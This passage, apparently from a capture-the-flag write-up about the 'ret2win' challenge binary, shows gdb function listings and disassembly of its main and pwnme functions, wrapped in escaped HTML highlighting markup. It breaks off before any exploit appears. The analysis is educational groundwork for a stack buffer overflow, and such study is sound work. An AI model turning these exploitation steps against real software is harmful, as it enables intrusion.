&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400697&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;main&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006e8&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;pwnme&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400756&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;ret2win&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400780&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;__libc_csu_init&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004007f0&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;__libc_csu_fini&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004007f4&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;_fini&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The binary has various functions has as shown in the output above.For initial analysis we start at the main function which is the entrypoint of our program.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;No&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;debugging&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;found&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;ret2win&lt;/span&gt;)
&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) di&lt;span style=&#34;color:#ef6155&#34;&gt;sas&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;main&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;Dump&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;code&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;main&lt;/span&gt;:
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400697&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;push&lt;/span&gt;   rbp
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400698&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rbp,rsp
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000040069b&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rax,&lt;span style=&#34;color:#fec418&#34;&gt;QWORD&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;PTR&lt;/span&gt; [&lt;span style=&#34;color:#ef6155&#34;&gt;rip&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x2009b6&lt;/span&gt;]        &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0x601058&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;stdout@@GLIBC_2.2.5&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006a2&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;11&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    ecx,&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006a7&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;16&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edx,&lt;span style=&#34;color:#f99b15&#34;&gt;0x2&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006ac&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;21&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    esi,&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006b1&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;26&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rdi,rax
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006b4&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;29&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x4005a0&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;setvbuf@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006b9&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;34&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edi,&lt;span style=&#34;color:#f99b15&#34;&gt;0x400808&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006be&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;39&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x400550&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;puts@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006c3&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;44&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edi,&lt;span style=&#34;color:#f99b15&#34;&gt;0x400820&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006c8&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x400550&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;puts@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006cd&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;54&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    eax,&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006d2&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;59&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x4006e8&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;pwnme&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006d7&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edi,&lt;span style=&#34;color:#f99b15&#34;&gt;0x400828&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006dc&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x400550&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;puts@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006e1&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    eax,&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006e6&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;79&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt;    rbp
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006e7&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;80&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;ret&lt;/span&gt;    
&lt;span style=&#34;color:#06b6ef&#34;&gt;End&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;dump.&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the initial analysis of the main function, we are calling an interesting function called &lt;strong&gt;pwnme&lt;/strong&gt;. Next disassemble &lt;strong&gt;pwnme&lt;/strong&gt; function to understand the behavior.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) di&lt;span style=&#34;color:#ef6155&#34;&gt;sas&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;pwnme&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;Dump&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;code&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;pwnme&lt;/span&gt;:
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006e8&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;push&lt;/span&gt;   rbp
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006e9&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rbp,rsp
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006ec&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;sub&lt;/span&gt;    rsp,&lt;span style=&#34;color:#f99b15&#34;&gt;0x20&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006f0&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;lea&lt;/span&gt;    rax,[rbp&lt;span style=&#34;color:#5bc4bf&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x20&lt;/span&gt;]
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006f4&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edx,&lt;span style=&#34;color:#f99b15&#34;&gt;0x20&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006f9&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;17&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    esi,&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006fe&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;22&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rdi,rax
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400701&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x400580&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;memset@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400706&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;30&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edi,&lt;span style=&#34;color:#f99b15&#34;&gt;0x400838&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000040070b&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;35&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x400550&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;puts@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400710&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edi,&lt;span style=&#34;color:#f99b15&#34;&gt;0x400898&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400715&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;45&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x400550&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;puts@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000040071a&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edi,&lt;span style=&#34;color:#f99b15&#34;&gt;0x4008b8&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000040071f&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;55&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x400550&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;puts@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400724&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;60&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edi,&lt;span style=&#34;color:#f99b15&#34;&gt;0x400918&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400729&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    eax,&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000040072e&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x400570&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;printf@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
